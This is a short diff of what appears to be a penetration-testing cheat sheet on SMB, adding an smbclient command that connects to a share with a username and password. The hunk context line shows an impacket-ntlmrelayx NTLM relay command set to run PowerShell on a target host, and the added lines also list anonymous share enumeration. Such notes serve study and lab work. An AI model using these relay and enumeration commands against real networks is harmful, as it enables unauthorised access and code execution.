@@ -189,8 +189,9 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powersh
 - smbclient
 ```
 smbclient -N -L //10.129.14.128
-```
 
+smbclient //server78//publicfolder -U=user%password```
+```
 - smb commands
 
 | Command        | Description                                                  |
